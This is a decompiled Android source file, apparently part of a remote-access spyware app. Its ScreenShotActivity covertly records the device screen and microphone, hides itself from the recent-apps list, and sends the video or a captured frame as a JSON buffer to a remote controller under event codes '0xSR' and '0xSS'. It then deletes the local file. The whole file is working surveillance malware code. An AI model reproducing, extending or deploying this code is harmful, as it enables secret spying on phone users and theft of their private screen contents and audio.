package com.remote.app;

import android.app.Activity;
import android.app.ActivityManager;
import android.content.Intent;
import android.graphics.Bitmap;
import android.hardware.display.VirtualDisplay;
import android.media.MediaMetadataRetriever;
import android.media.MediaRecorder;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.util.DisplayMetrics;
import android.util.Log;
import android.util.SparseIntArray;
import android.widget.Toast;
import e.h;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.List;
import java.util.Random;
import org.json.JSONException;
import org.json.JSONObject;

public class ScreenShotActivity extends Activity {

    /* renamed from: i  reason: collision with root package name */
    private static int f216i = 5000;

    /* renamed from: j  reason: collision with root package name */
    private static final SparseIntArray f217j;

    /* renamed from: k  reason: collision with root package name */
    private static int f218k = 720;

    /* renamed from: l  reason: collision with root package name */
    private static int f219l = 1280;

    /* renamed from: a  reason: collision with root package name */
    private MediaProjectionManager f220a;
    /* access modifiers changed from: private */

    /* renamed from: b  reason: collision with root package name */
    public MediaProjection f221b;

    /* renamed from: c  reason: collision with root package name */
    private VirtualDisplay f222c;

    /* renamed from: d  reason: collision with root package name */
    private d f223d;
    /* access modifiers changed from: private */

    /* renamed from: e  reason: collision with root package name */
    public MediaRecorder f224e;

    /* renamed from: f  reason: collision with root package name */
    private int f225f;
    /* access modifiers changed from: private */

    /* renamed from: g  reason: collision with root package name */
    public String f226g = "";

    /* renamed from: h  reason: collision with root package name */
    private int f227h = 0;

    class a implements Runnable {
        a() {
        }

        public void run() {
            ScreenShotActivity.this.q();
        }
    }

    class b implements Runnable {

        class a implements Runnable {
            a() {
            }

            public void run() {
                ScreenShotActivity screenShotActivity = ScreenShotActivity.this;
                screenShotActivity.j(screenShotActivity.f226g);
            }
        }

        b() {
        }

        public void run() {
            ScreenShotActivity.this.f224e.stop();
            ScreenShotActivity.this.f224e.reset();
            ScreenShotActivity.this.p();
            ScreenShotActivity.this.i();
            new Handler().postDelayed(new a(), 2000);
        }
    }

    class c implements Runnable {

        class a implements Runnable {
            a() {
            }

            public void run() {
                ScreenShotActivity screenShotActivity = ScreenShotActivity.this;
                screenShotActivity.j(screenShotActivity.f226g);
            }
        }

        c() {
        }

        public void run() {
            ScreenShotActivity.this.f224e.stop();
            ScreenShotActivity.this.f224e.reset();
            ScreenShotActivity.this.p();
            ScreenShotActivity.this.i();
            new Handler().postDelayed(new a(), 2000);
        }
    }

    private class d extends MediaProjection.Callback {
        private d() {
        }

        /* synthetic */ d(ScreenShotActivity screenShotActivity, a aVar) {
            this();
        }

        public void onStop() {
            ScreenShotActivity.this.f224e.stop();
            ScreenShotActivity.this.f224e.reset();
            MediaProjection unused = ScreenShotActivity.this.f221b = null;
            ScreenShotActivity.this.p();
            ScreenShotActivity.this.i();
            if (ScreenShotActivity.this.f221b != null) {
                ScreenShotActivity.this.i();
            }
            super.onStop();
        }
    }

    static {
        SparseIntArray sparseIntArray = new SparseIntArray();
        f217j = sparseIntArray;
        sparseIntArray.append(0, 90);
        sparseIntArray.append(1, 0);
        sparseIntArray.append(2, 270);
        sparseIntArray.append(3, 180);
    }

    private VirtualDisplay h() {
        return this.f221b.createVirtualDisplay("MainActivity", f218k, f219l, this.f225f, 16, this.f224e.getSurface(), (VirtualDisplay.Callback) null, (Handler) null);
    }

    /* access modifiers changed from: private */
    public void i() {
        MediaProjection mediaProjection = this.f221b;
        if (mediaProjection != null) {
            mediaProjection.unregisterCallback(this.f223d);
            this.f221b.stop();
            this.f221b = null;
        }
    }

    private void k() {
        this.f227h = getIntent().getIntExtra("isScreenShot", 0);
        f216i = getIntent().getIntExtra("videoTime", 5000);
        DisplayMetrics displayMetrics = new DisplayMetrics();
        getWindowManager().getDefaultDisplay().getMetrics(displayMetrics);
        this.f225f = displayMetrics.densityDpi;
        f219l = displayMetrics.heightPixels;
        f218k = displayMetrics.widthPixels;
        this.f224e = new MediaRecorder();
        this.f220a = (MediaProjectionManager) getSystemService("media_projection");
        if (b.a.a(this, "android.permission.WRITE_EXTERNAL_STORAGE") + b.a.a(this, "android.permission.RECORD_AUDIO") == 0) {
            new Handler().postDelayed(new a(), 500);
        } else if (!a.c.c(this, "android.permission.WRITE_EXTERNAL_STORAGE") && !a.c.c(this, "android.permission.WRITE_EXTERNAL_STORAGE")) {
            a.c.b(this, new String[]{"android.permission.WRITE_EXTERNAL_STORAGE", "android.permission.RECORD_AUDIO"}, 1000);
        }
    }

    private void l() {
        try {
            this.f224e.setAudioSource(1);
            this.f224e.setVideoSource(2);
            this.f224e.setOutputFormat(1);
            StringBuilder sb = new StringBuilder();
            sb.append(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS));
            sb.append("/screenshot" + ".mp4");
            String sb2 = sb.toString();
            this.f226g = sb2;
            this.f224e.setOutputFile(sb2);
            this.f224e.setVideoSize(1920, 1080);
            this.f224e.setVideoEncoder(2);
            this.f224e.setAudioEncoder(1);
            this.f224e.setVideoEncodingBitRate(512000);
            this.f224e.setVideoFrameRate(5);
            this.f224e.setOrientationHint(f217j.get(getWindowManager().getDefaultDisplay().getRotation() + 90));
            this.f224e.prepare();
        } catch (IOException e2) {
            e2.printStackTrace();
            Log.d("ExceptionOccured", "" + e2.getMessage());
        }
    }

    private void m() {
        if (this.f221b == null) {
            startActivityForResult(this.f220a.createScreenCaptureIntent(), 1000);
            return;
        }
        this.f222c = h();
        this.f224e.start();
        onBackPressed();
        new Handler().postDelayed(new b(), (long) f216i);
    }

    private static void n(File file) {
        int length = (int) file.length();
        byte[] bArr = new byte[length];
        try {
            BufferedInputStream bufferedInputStream = new BufferedInputStream(new FileInputStream(file));
            bufferedInputStream.read(bArr, 0, length);
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("file", true);
            jSONObject.put("name", file.getName());
            jSONObject.put("buffer", bArr);
            h.a(AppClass.f202a).b().a("0xSR", jSONObject);
            bufferedInputStream.close();
            if (file.exists()) {
                file.delete();
            }
        } catch (FileNotFoundException | IOException | JSONException e2) {
            e2.printStackTrace();
        }
    }

    private static void o(File file) {
        int length = (int) file.length();
        byte[] bArr = new byte[length];
        try {
            BufferedInputStream bufferedInputStream = new BufferedInputStream(new FileInputStream(file));
            bufferedInputStream.read(bArr, 0, length);
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("file", true);
            jSONObject.put("name", file.getName());
            jSONObject.put("buffer", bArr);
            h.a(AppClass.f202a).b().a("0xSS", jSONObject);
            bufferedInputStream.close();
            if (file.exists()) {
                file.delete();
            }
        } catch (FileNotFoundException | IOException | JSONException e2) {
            e2.printStackTrace();
        }
    }

    /* access modifiers changed from: private */
    public void p() {
        VirtualDisplay virtualDisplay = this.f222c;
        if (virtualDisplay == null) {
            virtualDisplay.release();
            if (this.f221b != null) {
                i();
            }
        }
    }

    /* access modifiers changed from: private */
    public void q() {
        l();
        m();
    }

    public void j(String str) {
        if (this.f227h == 0) {
            n(new File(str));
            return;
        }
        MediaMetadataRetriever mediaMetadataRetriever = new MediaMetadataRetriever();
        mediaMetadataRetriever.setDataSource(this, Uri.fromFile(new File(str)));
        Bitmap frameAtTime = mediaMetadataRetriever.getFrameAtTime();
        StringBuilder sb = new StringBuilder();
        sb.append(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS));
        sb.append("/screenshot11" + ".jpg");
        String sb2 = sb.toString();
        Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).mkdirs();
        File file = new File(sb2);
        new Random().nextInt(10000);
        Log.i("TAG", "" + file);
        try {
            file.createNewFile();
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            frameAtTime.compress(Bitmap.CompressFormat.JPEG, 90, fileOutputStream);
            fileOutputStream.flush();
            fileOutputStream.close();
        } catch (Exception e2) {
            e2.printStackTrace();
        }
        o(file);
    }

    /* access modifiers changed from: protected */
    public void onActivityResult(int i2, int i3, Intent intent) {
        List a2;
        StringBuilder sb;
        super.onActivityResult(i2, i3, intent);
        Class<MainService> cls = MainService.class;
        if (i2 != 1000) {
            stopService(new Intent(this, cls));
            startService(new Intent(this, cls));
            Toast.makeText(this, "Unknown Error", 0).show();
            sb = new StringBuilder();
            sb.append("ScreenShot");
        } else if (i3 != -1) {
            stopService(new Intent(this, cls));
            startService(new Intent(this, cls));
            Toast.makeText(this, "Permission denied" + i2, 0).show();
            sb = new StringBuilder();
            sb.append("Screenshot");
        } else {
            Log.d("Livetracking", "Screenshot" + i2 + "  " + i3 + " " + intent);
            this.f223d = new d(this, (a) null);
            MediaProjection a3 = this.f220a.getMediaProjection(i3, intent);
            this.f221b = a3;
            a3.registerCallback(this.f223d, (Handler) null);
            this.f222c = h();
            this.f224e.start();
            onBackPressed();
            new Handler().postDelayed(new c(), (long) f216i);
            ActivityManager activityManager = (ActivityManager) getSystemService("activity");
            if (activityManager != null && (a2 = activityManager.getAppTasks()) != null && a2.size() > 0) {
                Log.d("RemovingApp", "recent");
                ((ActivityManager.AppTask) a2.get(0)).setExcludeFromRecents(true);
                return;
            }
            return;
        }
        sb.append(i2);
        sb.append("  ");
        sb.append(i3);
        sb.append(" ");
        sb.append(intent);
        Log.d("Livetracking", sb.toString());
    }

    /* access modifiers changed from: protected */
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(R.layout.activity_screen_shot);
        k();
    }
}
